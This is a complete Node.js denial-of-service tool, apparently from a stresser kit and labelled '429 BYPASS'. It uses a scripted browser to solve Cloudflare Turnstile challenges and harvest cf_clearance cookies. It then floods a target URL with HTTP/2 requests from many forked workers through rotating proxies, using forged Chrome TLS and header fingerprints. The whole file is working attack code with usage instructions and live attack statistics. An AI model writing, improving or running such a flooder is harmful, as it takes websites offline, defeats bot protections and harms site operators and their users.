const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const net = require("net");
const fs = require("fs");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const EventEmitter = require('events');

EventEmitter.defaultMaxListeners = 0;

const MAX_CONCURRENT_STREAMS_PER_WORKER = 150;

// ── Chrome 133 matching TLS ciphers (JA3 fingerprint) ────────────────────────
const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-SHA",
    "ECDHE-RSA-AES256-SHA",
    "AES128-GCM-SHA256",
    "AES256-GCM-SHA384",
    "AES128-SHA",
    "AES256-SHA"
].join(":");

// ── Chrome 133 exact sigalgs ──────────────────────────────────────────────────
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
].join(":");

if (process.argv.length < 7) {
    console.log("\x1b[31m======[ 429 BYPASS CONCURRENT + PROXY ]======\x1b[0m");
    console.log("\x1b[31mUsage: node browser-like-px <target> <time> <rate> <threads> <cookieCount> <proxyFile>\x1b[0m");
    console.log("\x1b[33mExample: node browser-like-px https://target.com 60 64 4 2 proxies.txt\x1b[0m");
    console.log("\x1b[33mProxy format (one per line):\x1b[0m");
    console.log("  ip:port");
    console.log("  ip:port:user:pass");
    process.exit(1);
}

const args = {
    target:      process.argv[2],
    time:        parseInt(process.argv[3]),
    Rate:        parseInt(process.argv[4]),
    threads:     parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 2,
    proxyFile:   process.argv[7]
};

// ── Load & parse proxies ──────────────────────────────────────────────────────
function loadProxies(filePath) {
    if (!filePath || !fs.existsSync(filePath)) {
        console.log("\x1b[31m[!] Proxy file not found: " + filePath + "\x1b[0m");
        process.exit(1);
    }
    const lines = fs.readFileSync(filePath, "utf8")
        .split("\n")
        .map(l => l.trim())
        .filter(l => l && !l.startsWith("#"));

    const proxies = lines.map(line => {
        const parts = line.split(":");
        if (parts.length === 2) {
            return { host: parts[0], port: parseInt(parts[1]), user: null, pass: null };
        } else if (parts.length === 4) {
            return { host: parts[0], port: parseInt(parts[1]), user: parts[2], pass: parts[3] };
        }
        return null;
    }).filter(Boolean);

    if (proxies.length === 0) {
        console.log("\x1b[31m[!] No valid proxies found in " + filePath + "\x1b[0m");
        process.exit(1);
    }
    return proxies;
}

let proxyList = [];
let proxyIndex = 0;
let consecutive429 = 0;
let currentRate = args.Rate;

// ── Get next proxy (round-robin) ──────────────────────────────────────────────
function getProxy() {
    const px = proxyList[proxyIndex % proxyList.length];
    proxyIndex++;
    return px;
}

// ── Connect through HTTP CONNECT proxy tunnel ─────────────────────────────────
function connectViaProxy(proxy, targetHost, targetPort, callback) {
    const socket = net.connect(proxy.port, proxy.host, () => {
        let connectReq = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\n`;
        if (proxy.user && proxy.pass) {
            const auth = Buffer.from(proxy.user + ":" + proxy.pass).toString("base64");
            connectReq += `Proxy-Authorization: Basic ${auth}\r\n`;
        }
        connectReq += `\r\n`;
        socket.write(connectReq);
    });

    socket.once("data", (data) => {
        const response = data.toString();
        if (response.includes("200")) {
            callback(null, socket);
        } else {
            socket.destroy();
            callback(new Error("Proxy CONNECT failed: " + response.split("\r\n")[0]));
        }
    });

    socket.on("error", (err) => {
        callback(err);
    });

    socket.setTimeout(10000, () => {
        socket.destroy();
        callback(new Error("Proxy connection timeout"));
    });
}

// ── Data pools ────────────────────────────────────────────────────────────────
const LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.8,fr;q=0.7",
    "en-US,en;q=0.9,de;q=0.8",
    "en-GB,en;q=0.8"
];
const FETCH_SITES = ["none", "same-origin", "cross-site"];

// ── Main flood function (HTTP/2 via proxy tunnel + Chrome fingerprint) ─────────
function flood(userAgent, cookie) {
    try {
        const parsed = url.parse(args.target);
        const host = parsed.hostname || parsed.host;
        const path = parsed.path || '/';
        const proxy = getProxy();

        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        function getChromeVersion(ua) {
            const m = ua.match(/Chrome\/([\d.]+)/);
            return m ? m[1] : "133.0.0.0";
        }

        const chromever = getChromeVersion(userAgent);
        const chromeVersion = chromever.split('.')[0];
        const randValue = list => list[Math.floor(Math.random() * list.length)];

        const referers = [
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://duckduckgo.com/",
            "https://yandex.com/",
            "https://dstat.atlastresser.site/",
            args.target,
            "https://duckduckgo.com/?q=" + encodeURIComponent(host)
        ];

        function buildHeaders() {
            const headers = {
                ":method": "GET",
                ":authority": parsed.host,
                ":scheme": "https",
                ":path": path,
                "sec-ch-ua": `"Not(A:Brand";v="99", "Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-ch-ua-platform-version": "\"15.0.0\"",
                "sec-ch-ua-model": "\"\"",
                "sec-ch-ua-arch": "\"x86\"",
                "sec-ch-ua-bitness": "\"64\"",
                "sec-ch-ua-full-version-list": `"Not(A:Brand";v="99.0.0.0", "Google Chrome";v="${chromever}", "Chromium";v="${chromever}"`,
                "upgrade-insecure-requests": "1",
                "user-agent": userAgent,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "sec-fetch-site": randValue(FETCH_SITES),
                "sec-fetch-mode": "navigate",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "referer": randValue(referers),
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": randValue(LANGS),
                "priority": "u=0, i",
                "te": "trailers",
                "pragma": "no-cache",
                "cache-control": "no-cache"
            };
            if (cookie) headers["cookie"] = cookie;
            return headers;
        }

        // ── Tunnel TLS through proxy CONNECT ─────────────────────────────────
        connectViaProxy(proxy, host, 443, (err, socket) => {
            if (err) {
                global.failedRequests = (global.failedRequests || 0) + 1;
                global.totalRequests = (global.totalRequests || 0) + 1;
                return setTimeout(() => flood(userAgent, cookie), randomDelay(500, 1500));
            }

            // Wrap the tunneled socket with TLS (Chrome-matching fingerprint)
            const tlsSocket = tls.connect({
                socket: socket,
                host: host,
                servername: host,
                minVersion: "TLSv1.2",
                maxVersion: "TLSv1.3",
                ALPNProtocols: ["h2", "h3", "h3-29", "http/1.1"],
                ciphers: ciphers,
                sigalgs: sigalgs,
                ecdhCurve: "X25519:P-256:P-384:P-521",
                secureOptions:
                    crypto.constants.SSL_OP_NO_RENEGOTIATION |
                    crypto.constants.SSL_OP_NO_COMPRESSION |
                    crypto.constants.SSL_OP_NO_SSLv2 |
                    crypto.constants.SSL_OP_NO_SSLv3 |
                    crypto.constants.SSL_OP_NO_TLSv1 |
                    crypto.constants.SSL_OP_NO_TLSv1_1,
                rejectUnauthorized: false
            });

            tlsSocket.on("error", () => {
                global.failedRequests = (global.failedRequests || 0) + 1;
                global.totalRequests = (global.totalRequests || 0) + 1;
                if (!tlsSocket.destroyed) tlsSocket.destroy();
                setTimeout(() => flood(userAgent, cookie), randomDelay(500, 1500));
            });

            // ── HTTP/2 session over proxied TLS ───────────────────────────────
            const client = http2.connect(args.target, {
                createConnection: () => tlsSocket,
                settings: {
                    headerTableSize: 65536,
                    enablePush: false,
                    initialWindowSize: 6291456,
                    maxConcurrentStreams: 1000,
                    maxFrameSize: 16384,
                    maxHeaderListSize: 262144
                }
            });

            client.on("connect", () => {
                function sendRequests() {
                    if (client.destroyed || client.closed) return;

                    for (let i = 0; i < args.Rate; i++) {
                        const request = client.request(buildHeaders());

                        request.on("response", (res) => {
                            global.successRequests = (global.successRequests || 0) + 1;
                            global.totalRequests = (global.totalRequests || 0) + 1;
                            const status = res[":status"];
                            if (status === 429 || status === 503) {
                                consecutive429++;
                                client.close();
                            }
                        });

                        request.on("error", () => {
                            global.failedRequests = (global.failedRequests || 0) + 1;
                            global.totalRequests = (global.totalRequests || 0) + 1;
                        });

                        request.end();
                    }

                    setTimeout(sendRequests, randomDelay(500, 2000));
                }
                sendRequests();
            });

            client.on("close", () => {
                if (!client.destroyed) client.destroy();
                setTimeout(() => flood(userAgent, cookie), randomDelay(500, 1500));
            });

            client.on("error", () => {
                global.failedRequests = (global.failedRequests || 0) + 1;
                global.totalRequests = (global.totalRequests || 0) + 1;
                if (!client.destroyed) client.destroy();
                setTimeout(() => flood(userAgent, cookie), randomDelay(500, 1500));
            });

            client.setTimeout(20000, () => {
                if (!client.destroyed) client.destroy();
            });
        });

    } catch (err) {
        setTimeout(() => flood(userAgent, cookie), 1000);
    }
}

// ── Cloudflare Bypass via Puppeteer ──────────────────────────────────────────
async function bypassCloudflareOnce(attemptNum) {
    let browser = null;
    let page = null;

    try {
        console.log("\x1b[33m[CF Bypass] Attempt " + attemptNum + "...\x1b[0m");

        const response = await connect({
            headless: false,
            turnstile: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-blink-features=AutomationControlled',
                '--enable-quic',
                '--quic-version=h3',
                '--origin-to-force-quic-on=' + url.parse(args.target).host + ':443'
            ],
            customConfig: {},
            connectOption: { defaultViewport: null },
            disableXvfb: false
        });

        if (!response || !response.browser) throw new Error("Failed to launch browser");
        browser = response.browser;
        page = response.page;

        console.log("\x1b[33m[CF Bypass] Accessing " + args.target + "...\x1b[0m");
        await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 60000 });

        let challengeCompleted = false;
        let checkCount = 0;

        while (!challengeCompleted && checkCount < 60) {
            await new Promise(r => setTimeout(r, 1000));
            try {
                const x = 50 + Math.random() * 500;
                const y = 50 + Math.random() * 500;
                await page.mouse.move(x, y);
            } catch (e) { }

            try {
                const iframe = page.frames().find(f => f.url().includes('cloudflare'));
                if (iframe) {
                    const cb = await iframe.$('.cb-c');
                    if (cb) await cb.click();
                }
            } catch (e) { }

            const cookies = await page.cookies();
            const cfClearance = cookies.find(c => c.name === "cf_clearance");
            if (cfClearance) { challengeCompleted = true; break; }
            checkCount++;
        }

        const cookies = await page.cookies();
        const cfClearance = cookies.find(c => c.name === "cf_clearance");
        const userAgent = await page.evaluate(() => navigator.userAgent);

        if (browser) await browser.close();

        if (cfClearance) {
            console.log("\x1b[32m[CF Bypass] Success! Got cf_clearance\x1b[0m");
            return { cookies, userAgent, success: true };
        } else {
            console.log("\x1b[31m[CF Bypass] Failed - No cf_clearance\x1b[0m");
            return { cookies: [], userAgent, success: false };
        }

    } catch (error) {
        console.log("\x1b[31m[CF Bypass] Error: " + error.message + "\x1b[0m");
        if (browser) { try { await browser.close(); } catch (e) { } }
        return { success: false };
    }
}

async function bypassCloudflareParallel(totalCount) {
    console.log("\x1b[35m429 BYPASS - CONCURRENT + PROXY ROTATION\x1b[0m");
    const results = [];

    for (let i = 0; i < totalCount; i++) {
        const res = await bypassCloudflareOnce(i + 1);
        if (res.success) results.push(res);
        if (results.length >= totalCount) break;
    }

    if (results.length === 0) {
        console.log("\x1b[31mFailed to get CF cookies. Using fallback.\x1b[0m");
        results.push({
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
            success: true
        });
    }
    return results;
}

function runFlooder() {
    const bypassInfo = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
    if (!bypassInfo) return;

    const cookieString = bypassInfo.cookies
        ? bypassInfo.cookies.map(c => c.name + "=" + c.value).join("; ")
        : "";
    const userAgent = bypassInfo.userAgent ||
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36";

    flood(userAgent, cookieString);
}

function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    console.clear();
    console.log("\x1b[31m======[ 429 BYPASS CONCURRENT + PROXY ROTATION ]======\x1b[0m");
    console.log("\x1b[36mTarget:\x1b[0m      " + args.target);
    console.log("\x1b[36mTime:\x1b[0m        " + elapsed + "s / " + args.time + "s");
    console.log("\x1b[36mRate:\x1b[0m        " + currentRate + " req/burst | " + args.threads + " workers");
    console.log("\x1b[36mProxies:\x1b[0m     " + proxyList.length + " loaded | Rotated: " + proxyIndex);
    console.log("\x1b[36mCurrent Proxy:\x1b[0m " + (proxyList[proxyIndex % proxyList.length] ? proxyList[proxyIndex % proxyList.length].host + ":" + proxyList[proxyIndex % proxyList.length].port : "N/A"));
    console.log("\x1b[36mTotal:\x1b[0m       " + (global.totalRequests || 0) +
        " | \x1b[32mOK:\x1b[0m " + (global.successRequests || 0) +
        " | \x1b[31mErr:\x1b[0m " + (global.failedRequests || 0));
    console.log("\x1b[36m429 Count:\x1b[0m   " + consecutive429);
}

// ── Init ──────────────────────────────────────────────────────────────────────
proxyList = loadProxies(args.proxyFile);

global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.startTime = Date.now();
global.bypassData = [];

if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35m429 BYPASS - LIKELY HUMAN + PROXY ROTATION\x1b[0m");
    console.log("\x1b[32mLoaded " + proxyList.length + " proxies from " + args.proxyFile + "\x1b[0m");

    (async () => {
        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
        global.bypassData = bypassResults;

        console.log("\n\x1b[32mGot " + bypassResults.length + " sessions. Forking " + args.threads + " workers...\x1b[0m");
        global.startTime = Date.now();

        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ type: 'bypassData', data: bypassResults, proxies: proxyList });
        }

        const statsInterval = setInterval(displayStats, 1000);

        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.totalRequests   += message.total   || 0;
                global.successRequests += message.success || 0;
                global.failedRequests  += message.failed  || 0;
            }
        });

        setTimeout(() => {
            clearInterval(statsInterval);
            console.log("\n\x1b[32mAttack completed.\x1b[0m");
            process.exit(0);
        }, args.time * 1000);
    })();

} else {
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            global.bypassData = msg.data;
            proxyList = msg.proxies || proxyList;

            for (let i = 0; i < MAX_CONCURRENT_STREAMS_PER_WORKER; i++) {
                setTimeout(() => runFlooder(), i * 50);
            }

            setInterval(() => {
                process.send({
                    type: 'stats',
                    total:   global.totalRequests   || 0,
                    success: global.successRequests || 0,
                    failed:  global.failedRequests  || 0
                });
                global.totalRequests   = 0;
                global.successRequests = 0;
                global.failedRequests  = 0;
            }, 1000);
        }
    });
}

process.on('uncaughtException', () => { });
process.on('unhandledRejection', () => { });
